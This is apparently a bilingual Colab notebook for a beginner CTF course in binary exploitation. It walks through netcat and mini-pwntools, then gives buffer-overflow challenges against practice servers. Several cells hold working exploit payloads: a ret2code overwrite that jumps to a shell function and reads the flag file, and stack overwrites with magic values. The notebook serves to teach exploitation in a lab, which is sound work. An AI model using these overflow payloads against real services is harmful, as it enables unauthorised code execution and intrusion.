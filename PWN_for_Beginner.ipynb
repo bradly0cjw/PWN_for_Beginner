{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/bradly0cjw/PWN_for_Beginner/blob/main/PWN_for_Beginner.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Pwn for Beginner\n",
        "\n",
        "## Install Dependencies 安裝必要程式\n",
        "\n",
        "- netcat"
      ],
      "metadata": {
        "id": "xK-8ipNJZfTe"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "ufeAVSa7WTDO"
      },
      "outputs": [],
      "source": [
        "!apt-get install netcat"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Challenge 1 - Crash\n",
        "\n",
        "Try to connect to the challenge and crash it!\n",
        "\n",
        "It would print out the flag if the program is crashed.\n",
        "\n",
        "嘗試利用 nc 連線上題目並破壞它吧！\n",
        "\n",
        "一旦程式發生錯誤，就可以得到這題的 FLAG"
      ],
      "metadata": {
        "id": "qkv-VVfJZ4Aq"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!nc archer.ee.ntu.edu.tw 8000"
      ],
      "metadata": {
        "id": "gAWTQi0wa9Eg"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Take a look at the source code. What's the problem?\n",
        "\n",
        "看看這支程式的原始碼，問題出在哪？"
      ],
      "metadata": {
        "id": "YUhvJo3Xb3EW"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# download the source code 下載原始碼\n",
        "!wget http://archer.ee.ntu.edu.tw:8888/files/1071ef4c8edd05cc0ab02cd614c113fe/crash.c -O crash.c"
      ],
      "metadata": {
        "id": "ZjR8pB0OcP-I"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# print the source code 印出原始碼\n",
        "!cat ./crash.c"
      ],
      "metadata": {
        "id": "M3V0LIzCdQ_c"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Pwntools Tutorial"
      ],
      "metadata": {
        "id": "IgIAVrhTSMP3"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# install mini-pwntools 安裝 mini-pwntools 套件套件\n",
        "!pip3 install git+https://github.com/OAlienO/mini-pwntools.git"
      ],
      "metadata": {
        "id": "pdjU6oA_S_yK"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# interact with the remote process\n",
        "# 與遠端程式互動\n",
        "\n",
        "from minipwn import *\n",
        "\n",
        "r = remote('archer.ee.ntu.edu.tw', 8000)            # connect to 8000 port of archer.ee.ntu.edu.tw\n",
        "                                                    # 連線到 archer.ee.ntu.edu.tw 的 8000 端口\n",
        "\n",
        "\"\"\" example I/O 範例輸入/輸出\n",
        "Hello World!\n",
        "What do you want to say: aaa\n",
        "Did you mean \"aaa\"? Nice.\n",
        "\"\"\"\n",
        "\n",
        "s = r.recvuntil('!')                                # receive until character '!' and store it to variable s (include '!')\n",
        "                                                    # 從遠端接收文字直到出現 '!'，並儲存到變數 s (包含 '!')\n",
        "print(s)\n",
        "\n",
        "r.recvuntil(':')\n",
        "r.sendline(b'aaa')                                  # send 'aaa' (equivalent to entering 'aaa' with nc)\n",
        "                                                    # 送字串字串 'aaa' 到遠端 (等同於在用 nc 連線時直接打 'aaa')\n",
        "s = r.recvuntil('\\n')\n",
        "print(s)"
      ],
      "metadata": {
        "id": "SpyfXVVITRhc"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Challenge 2 - ret2code"
      ],
      "metadata": {
        "id": "gFsSwC72Zw19"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# take a look at the challenge!\n",
        "# 先連上去看看題目\n",
        "\n",
        "!nc archer.ee.ntu.edu.tw 8001"
      ],
      "metadata": {
        "id": "sWaJemBeb-R_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# download and print the source code\n",
        "# 下載並印出原始碼\n",
        "\n",
        "!wget http://archer.ee.ntu.edu.tw:8888/files/0e6e0d0da16308de573d6f20cc8e77e2/ret2code.c -O ret2code.c\n",
        "\n",
        "!echo '============== SOURCE CODE =============='\n",
        "!cat ./ret2code.c"
      ],
      "metadata": {
        "id": "ZW5J5QyFcaVc"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# download the binary\n",
        "# 下載執行檔\n",
        "\n",
        "!wget http://archer.ee.ntu.edu.tw:8888/files/1cb2cc23b69e22a55f8b598af934c0e1/ret2code -O ret2code"
      ],
      "metadata": {
        "id": "oC3Slnv-dTsb"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# find the address of shell function\n",
        "# 尋找 shell 函式的位置\n",
        "\n",
        "!objdump -M intel -d ./ret2code | grep 'shell'"
      ],
      "metadata": {
        "id": "dIy_hpc5c5e9"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Exploit with pwntools\n",
        "# 利用 pwntools 攻擊遠端程式\n",
        "\n",
        "from minipwn import *\n",
        "\n",
        "def interactive(r):                                   # interactive function, equivalent to connect directly thorugh nc\n",
        "  while True:                                         # 互動模式, 等同於是直接用 nc 連線\n",
        "    r.sendline(input())\n",
        "    print(r.s.recv(1024).decode('utf-8'))\n",
        " \n",
        "\n",
        "\n",
        "r = remote('archer.ee.ntu.edu.tw', 8001)\n",
        "\n",
        "r.sendline(b'a'*0x10 + p64(0x400607))                 # payload = offset + shell address\n",
        "r.recvuntil('\\n')                                     # receive the output 接收輸出\n",
        "\n",
        "r.sendline('cat /home/ctf/flag')                      # send shell command to print the flag 使用指令來印出 flag\n",
        "s = r.recvuntil('\\n')                                 # receive the output 接收輸出\n",
        "\n",
        "print(s)\n",
        "\n",
        "interactive(r)"
      ],
      "metadata": {
        "id": "0sRtIzbeb2dc"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Challenge 3 - Aniki\n",
        "\n",
        "Aniki has some words to tell you!\n",
        "\n",
        "Hint: There is a buffer overflow vulnerability in this program, try to use ret2code technique to solve it.\n",
        "\n",
        "提示: 這個程式有 buffer overflow 的漏洞，試著用 ret2code 的技巧解開它吧！"
      ],
      "metadata": {
        "id": "MAaqTNu2mJFa"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Exploit with pwntools\n",
        "# 利用 pwntools 攻擊遠端程式\n",
        "\n",
        "from minipwn import *\n",
        "\n",
        "def interactive(r):                                   # interactive function, equivalent to connect directly thorugh nc\n",
        "  while True:                                         # 互動模式, 等同於是直接用 nc 連線\n",
        "    r.sendline(input())\n",
        "    print(r.s.recv(1024).decode('utf-8'))\n",
        "\n",
        "r = remote('archer.ee.ntu.edu.tw', 8003)\n",
        "\n",
        "# ========= WRITE YOUR CODE HERE =========\n",
        "\n",
        "\n",
        "\n",
        "# ========================================\n",
        "\n",
        "interactive(r)"
      ],
      "metadata": {
        "id": "auiWI8zFmnkk"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Challenge 4 - pass\n",
        "\n",
        "pass me if you can"
      ],
      "metadata": {
        "id": "xRKGwVxfo7_e"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Exploit with pwntools\n",
        "# 利用 pwntools 攻擊遠端程式\n",
        "\n",
        "from minipwn import *\n",
        "\n",
        "def interactive(r):                                   # interactive function, equivalent to connect directly thorugh nc\n",
        "  while True:                                         # 互動模式, 等同於是直接用 nc 連線\n",
        "    r.sendline(input())\n",
        "    print(r.s.recv(1024).decode('utf-8'))\n",
        "\n",
        "r = remote('archer.ee.ntu.edu.tw', 8002)\n",
        "\n",
        "print(b'a'*(0xc-0x4) + p64(0xdeadbeef))\n",
        "\n",
        "r.sendline(b'a'*(0xc-0x4) + p64(0xdeadbeef))\n",
        "\n",
        "interactive(r)"
      ],
      "metadata": {
        "id": "9ro89M08pCRJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Challenge 5 - luck"
      ],
      "metadata": {
        "id": "CP0xk9XMZ8_j"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from minipwn import *\n",
        "\n",
        "def interactive(r):                                   # interactive function, equivalent to connect directly thorugh nc\n",
        "  while True:                                         # 互動模式, 等同於是直接用 nc 連線\n",
        "    print(r.s.recv(1024))\n",
        "    r.sendline(input())\n",
        "\n",
        "r = remote('archer.ee.ntu.edu.tw', 8004)\n",
        "\n",
        "r.recvuntil('\\n')\n",
        "r.recvuntil('\\n')\n",
        "\n",
        "r.sendline(b'a'*12 + p64(0xfaceb00c)[:4] + p64(0xdeadbeef)[:4] + p64(0x0))\n",
        "\n",
        "interactive(r)"
      ],
      "metadata": {
        "id": "-JGx7RaSaAbm"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}